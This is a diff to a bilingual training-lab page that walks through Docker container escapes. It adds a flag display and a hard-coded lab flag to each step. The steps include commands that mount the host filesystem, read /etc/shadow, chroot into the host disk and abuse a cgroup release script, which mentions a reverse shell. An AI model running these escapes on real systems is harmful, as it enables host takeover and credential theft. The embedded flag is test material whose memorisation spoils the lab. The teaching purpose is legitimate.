@@ -10,6 +10,13 @@
     {% endfor %}{% endif %}
   {% endwith %}
 
+  {% if flag %}
+  <div class="hl-card mb-4 border-l-4" style="border-left-color:#22c55e">
+    <div class="text-xs text-green-500 font-semibold mb-1">Flag de escape detectada</div>
+    <pre class="font-mono text-sm break-all" style="color:var(--hl-primary)">{{ flag }}</pre>
+  </div>
+  {% endif %}
+
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-4" data-i18n="container_recon">Container Recon</h2>
 
@@ -101,7 +108,8 @@
         <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
       </li>
       <li>Desde dentro del chroot tienes acceso completo al host. Lee la flag:
-        <pre>cat /root/flag.txt</pre>
+        <pre>cat /root/root.txt
+# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
@@ -121,7 +129,8 @@ mount /dev/sda1 /tmp/hostdisk</pre>
         <pre>chroot /tmp/hostdisk</pre>
       </li>
       <li>Lee la flag:
-        <pre>cat /root/flag.txt</pre>
+        <pre>cat /root/root.txt
+# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
@@ -144,7 +153,8 @@ chmod a+x /cmd</pre>
 cat /output</pre>
       </li>
       <li>Adapta el script para leer la flag o lanzar una reverse shell:
-        <pre>echo "cat /root/flag.txt &gt; ${host_path}/output" &gt;&gt; /cmd</pre>
+        <pre>echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
+# Flag dedicada del lab: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
@@ -165,7 +175,8 @@ cat /output</pre>
         <pre>docker run --rm -v /:/mnt alpine chroot /mnt sh -c "cat /etc/shadow"</pre>
       </li>
       <li>Inside the chroot you have full host access. Read the flag:
-        <pre>cat /root/flag.txt</pre>
+        <pre>cat /root/root.txt
+# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
@@ -185,7 +196,8 @@ mount /dev/sda1 /tmp/hostdisk</pre>
         <pre>chroot /tmp/hostdisk</pre>
       </li>
       <li>Read the flag:
-        <pre>cat /root/flag.txt</pre>
+        <pre>cat /root/root.txt
+# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
@@ -208,7 +220,8 @@ chmod a+x /cmd</pre>
 cat /output</pre>
       </li>
       <li>Adapt the script to read the flag or launch a reverse shell:
-        <pre>echo "cat /root/flag.txt &gt; ${host_path}/output" &gt;&gt; /cmd</pre>
+        <pre>echo "cat /root/root.txt &gt; ${host_path}/output" &gt;&gt; /cmd
+# Dedicated lab flag: HL{c0n741n3r_35c4p3_h057_4cc355}</pre>
       </li>
     </ol>
 
